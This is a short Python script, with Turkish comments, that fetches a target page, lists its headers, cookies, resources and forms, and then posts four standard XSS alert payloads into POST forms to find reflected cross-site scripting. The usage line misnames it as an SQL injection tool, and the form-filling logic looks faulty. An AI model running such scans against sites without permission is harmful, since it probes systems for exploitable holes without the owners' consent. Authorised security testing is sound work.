import requests
import json
from bs4 import BeautifulSoup
import time
import sys

# Hedef URL

if len(sys.argv) != 2:
    print("Usage: python3 Sqlinjection.py <target_url>")
    sys.exit(1)

target_url = sys.argv[1]

# XSS yükleri
xss_payloads = [
    "<script>alert('XSS1')</script>",
    "<img src=x onerror=alert('XSS2')>",
    "<svg/onload=alert('XSS3')>",
    "<body onload=alert('XSS4')>"
]

# Örnek fonksiyon
def analyze_site(url):
    start_time = time.time()
    
    # Hedef siteye GET isteği gönder
    response = requests.get(url)
    
    # Yanıt süresini hesapla
    response_time = time.time() - start_time
    
    # Çerezleri al
    cookies = response.cookies.get_dict()
    
    # Yanıtın içeriğini al
    content = response.text
    
    # Yanıtın başlıklarını al
    headers = dict(response.headers)  # Headers'ı sözlüğe dönüştür
    
    # HTML içeriğini parse et
    soup = BeautifulSoup(content, 'html.parser')
    
    # Gömülü kaynakları (JS, CSS, img) bul
    scripts = [script['src'] for script in soup.find_all('script', src=True)]
    stylesheets = [link['href'] for link in soup.find_all('link', rel='stylesheet')]
    images = [img['src'] for img in soup.find_all('img', src=True)]
    
    # Form elemanlarını bul
    forms = soup.find_all('form')
    form_details = []
    for form in forms:
        form_info = {
            'action': form.get('action'),
            'method': form.get('method'),
            'inputs': [{input_tag.get('name'): input_tag.get('value')} for input_tag in form.find_all('input')]
        }
        form_details.append(form_info)
    
    # Verileri birleştir (JSON formatında)
    site_data = {
        "response_time": response_time,
        "status_code": response.status_code,
        "headers": headers,
        "cookies": cookies,
        "content_length": len(content),
        "scripts": scripts,
        "stylesheets": stylesheets,
        "images": images,
        "forms": form_details
    }

    # Verileri JSON formatında yazdır
    print(json.dumps(site_data, indent=4))

    # XSS yüklerini formlarda test et
    for form in form_details:
        if form['method'].lower() == 'post':
            for payload in xss_payloads:
                # Her bir girdi alanına XSS yükünü enjekte et
                data = {input_name: payload for input_name, _ in form['inputs'][0].items()}
                
                # Form aksiyonuna göre POST isteği gönder
                action_url = url + form['action']
                response = requests.post(action_url, data=data)
                
                # Yanıtın içeriğini kontrol et
                if payload in response.text:
                    print(f"XSS açığı bulundu! Yük: {payload} URL: {action_url}")

# Fonksiyonu çağırarak işlemi gerçekleştir
analyze_site(target_url)
